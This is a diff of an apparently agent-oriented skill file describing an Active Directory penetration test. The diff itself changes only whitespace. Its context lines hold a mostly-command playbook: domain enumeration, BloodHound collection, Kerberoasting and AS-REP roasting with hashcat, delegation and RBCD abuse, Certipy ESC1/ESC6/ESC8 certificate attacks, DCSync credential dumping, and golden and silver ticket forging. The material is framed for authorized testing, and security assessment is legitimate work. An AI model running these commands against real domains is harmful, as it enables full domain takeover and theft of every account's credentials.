@@ -1,10 +1,10 @@
 ---
 name: performing-active-directory-penetration-test
 description: Conduct a focused Active Directory penetration test using BloodHound,
-  Impacket, Certipy, Rubeus, and NetExec to enumerate domain objects, discover attack
-  paths, exploit Kerberos weaknesses, escalate privileges via ADCS/DCSync, and demonstrate
-  domain compromise. Use when running an authorized AD pentest from a standard domain
-  user foothold toward Domain Admin or Enterprise Admin.
+ Impacket, Certipy, Rubeus, and NetExec to enumerate domain objects, discover attack
+ paths, exploit Kerberos weaknesses, escalate privileges via ADCS/DCSync, and demonstrate
+ domain compromise. Use when running an authorized AD pentest from a standard domain
+ user foothold toward Domain Admin or Enterprise Admin.
 domain: cybersecurity
 subdomain: penetration-testing
 tags:
@@ -64,7 +64,7 @@ netexec smb 10.0.0.5 -u 'testuser' -p 'Password123' -d corp.local --users
 
 # LDAP enumeration — domain controllers
 ldapsearch -x -H ldap://10.0.0.5 -D "testuser@corp.local" -w "Password123" \
-  -b "OU=Domain Controllers,DC=corp,DC=local" "(objectClass=computer)" dNSHostName
+ -b "OU=Domain Controllers,DC=corp,DC=local" "(objectClass=computer)" dNSHostName
 
 # Enumerate trust relationships
 netexec smb 10.0.0.5 -u 'testuser' -p 'Password123' --trusts
@@ -77,13 +77,13 @@ netexec smb 10.0.0.5 -u 'testuser' -p 'Password123' --gpp-passwords
 
 # Find computers with unconstrained delegation
 ldapsearch -x -H ldap://10.0.0.5 -D "testuser@corp.local" -w "Password123" \
-  -b "DC=corp,DC=local" "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" \
-  dNSHostName
+ -b "DC=corp,DC=local" "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" \
+ dNSHostName
 
 # Find users with constrained delegation
 ldapsearch -x -H ldap://10.0.0.5 -D "testuser@corp.local" -w "Password123" \
-  -b "DC=corp,DC=local" "(&(objectCategory=user)(msds-allowedtodelegateto=*))" \
-  sAMAccountName msds-allowedtodelegateto
+ -b "DC=corp,DC=local" "(&(objectCategory=user)(msds-allowedtodelegateto=*))" \
+ sAMAccountName msds-allowedtodelegateto
 
 # Enumerate LAPS
 netexec ldap 10.0.0.5 -u 'testuser' -p 'Password123' -d corp.local -M laps
@@ -94,7 +94,7 @@ netexec ldap 10.0.0.5 -u 'testuser' -p 'Password123' -d corp.local -M laps
 ```bash
 # Collect all BloodHound data
 bloodhound-python -u 'testuser' -p 'Password123' -d corp.local \
-  -ns 10.0.0.5 -c all --zip
+ -ns 10.0.0.5 -c all --zip
 
 # Alternative: SharpHound from Windows
 .\SharpHound.exe -c All --zipfilename bloodhound_data.zip
@@ -120,12 +120,12 @@ impacket-GetUserSPNs 'corp.local/testuser:Password123' -dc-ip 10.0.0.5
 
 # Find accounts without Kerberos pre-authentication
 impacket-GetNPUsers 'corp.local/' -usersfile domain_users.txt \
-  -dc-ip 10.0.0.5 -format hashcat
+ -dc-ip 10.0.0.5 -format hashcat
 
 # Find managed service accounts
 ldapsearch -x -H ldap://10.0.0.5 -D "testuser@corp.local" -w "Password123" \
-  -b "DC=corp,DC=local" "(objectClass=msDS-GroupManagedServiceAccount)" \
-  sAMAccountName msDS-GroupMSAMembership
+ -b "DC=corp,DC=local" "(objectClass=msDS-GroupManagedServiceAccount)" \
+ sAMAccountName msDS-GroupMSAMembership
 ```
 
 ## Phase 2 — Kerberos Attacks
@@ -135,11 +135,11 @@ ldapsearch -x -H ldap://10.0.0.5 -D "testuser@corp.local" -w "Password123" \
 ```bash
 # Extract TGS tickets for service accounts
 impacket-GetUserSPNs 'corp.local/testuser:Password123' -dc-ip 10.0.0.5 \
-  -outputfile kerberoast.txt -request
+ -outputfile kerberoast.txt -request
 
 # Crack with Hashcat (mode 13100 for Kerberos 5 TGS-REP etype 23)
 hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt \
-  -r /usr/share/hashcat/rules/best64.rule --force
+ -r /usr/share/hashcat/rules/best64.rule --force
 
 # Targeted Kerberoasting with Rubeus (Windows)
 .\Rubeus.exe kerberoast /user:svc_sql /outfile:svc_sql_tgs.txt
@@ -150,7 +150,7 @@ hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt \
 ```bash
 # Target accounts without pre-authentication
 impacket-GetNPUsers 'corp.local/' -usersfile users.txt -dc-ip 10.0.0.5 \
-  -outputfile asrep.txt -format hashcat
+ -outputfile asrep.txt -format hashcat
 
 # Crack AS-REP hashes (mode 18200)
 hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
@@ -168,17 +168,17 @@ hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
 
 # Constrained delegation — S4U abuse
 impacket-getST 'corp.local/svc_web:WebPass123' -spn 'CIFS/fileserver.corp.local' \
-  -dc-ip 10.0.0.5 -impersonate administrator
+ -dc-ip 10.0.0.5 -impersonate administrator
 export KRB5CCNAME=administrator.ccache
 impacket-psexec 'corp.local/administrator@fileserver.corp.local' -k -no-pass
 
 # Resource-Based Constrained Delegation (RBCD)
 impacket-addcomputer 'corp.local/testuser:Password123' -computer-name 'EVIL$' \
-  -computer-pass 'EvilPass123' -dc-ip 10.0.0.5
+ -computer-pass 'EvilPass123' -dc-ip 10.0.0.5
 python3 rbcd.py -delegate-to 'TARGET$' -delegate-from 'EVIL$' \
-  -dc-ip 10.0.0.5 'corp.local/testuser:Password123'
+ -dc-ip 10.0.0.5 'corp.local/testuser:Password123'
 impacket-getST 'corp.local/EVIL$:EvilPass123' -spn 'CIFS/target.corp.local' \
-  -impersonate administrator -dc-ip 10.0.0.5
+ -impersonate administrator -dc-ip 10.0.0.5
 ```
 
 ## Phase 3 — ADCS (Active Directory Certificate Services) Attacks
@@ -186,12 +186,12 @@ impacket-getST 'corp.local/EVIL$:EvilPass123' -spn 'CIFS/target.corp.local' \
 ```bash
 # Enumerate ADCS with Certipy
 certipy find -u 'testuser@corp.local' -p 'Password123' -dc-ip 10.0.0.5 \
-  -vulnerable -stdout
+ -vulnerable -stdout
 
 # ESC1 — Vulnerable certificate template (enrollee can specify SAN)
 certipy req -u 'testuser@corp.local' -p 'Password123' \
-  -target ca.corp.local -ca CORP-CA \
-  -template VulnerableWebServer -upn administrator@corp.local
+ -target ca.corp.local -ca CORP-CA \
+ -template VulnerableWebServer -upn administrator@corp.local
 
 # Authenticate with the certificate
 certipy auth -pfx administrator.pfx -dc-ip 10.0.0.5
@@ -201,12 +201,12 @@ certipy auth -pfx administrator.pfx -dc-ip 10.0.0.5
 
 # ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 flag on CA
 certipy req -u 'testuser@corp.local' -p 'Password123' \
-  -target ca.corp.local -ca CORP-CA \
-  -template User -upn administrator@corp.local
+ -target ca.corp.local -ca CORP-CA \
+ -template User -upn administrator@corp.local
 
 # ESC8 — NTLM relay to HTTP enrollment endpoint
 certipy relay -target 'http://ca.corp.local/certsrv/certfnsh.asp' \
-  -template DomainController
+ -template DomainController
 ```
 
 ## Phase 4 — Domain Privilege Escalation
@@ -219,7 +219,7 @@ impacket-secretsdump 'corp.local/domainadmin:DAPass@10.0.0.5' -just-dc
 
 # DCSync specific user
 impacket-secretsdump 'corp.local/domainadmin:DAPass@10.0.0.5' \
-  -just-dc-user krbtgt
+ -just-dc-user krbtgt
 
 # With Mimikatz (Windows)
 mimikatz# lsadump::dcsync /domain:corp.local /user:krbtgt
@@ -230,13 +230,13 @@ mimikatz# lsadump::dcsync /domain:corp.local /user:krbtgt
 ```bash
 # Create Golden Ticket (requires krbtgt hash and domain SID)
 impacket-ticketer -nthash <krbtgt_nthash> -domain-sid S-1-5-21-... \
-  -domain corp.local administrator
+ -domain corp.local administrator
 export KRB5CCNAME=administrator.ccache
 impacket-psexec 'corp.local/administrator@dc01.corp.local' -k -no-pass
 
 # With Mimikatz
 mimikatz# kerberos::golden /user:administrator /domain:corp.local \
-  /sid:S-1-5-21-... /krbtgt:<hash> /ptt
+ /sid:S-1-5-21-... /krbtgt:<hash> /ptt
 ```
 
 ### Silver Ticket
@@ -244,7 +244,7 @@ mimikatz# kerberos::golden /user:administrator /domain:corp.local \
 ```bash
 # Create Silver Ticket for specific service
 impacket-ticketer -nthash <service_nthash> -domain-sid S-1-5-21-... \
-  -domain corp.local -spn MSSQL/sqlserver.corp.local administrator
+ -domain corp.local -spn MSSQL/sqlserver.corp.local administrator
 
 export KRB5CCNAME=administrator.ccache
 impacket-mssqlclient 'corp.local/administrator@sqlserver.corp.local' -k -no-pass
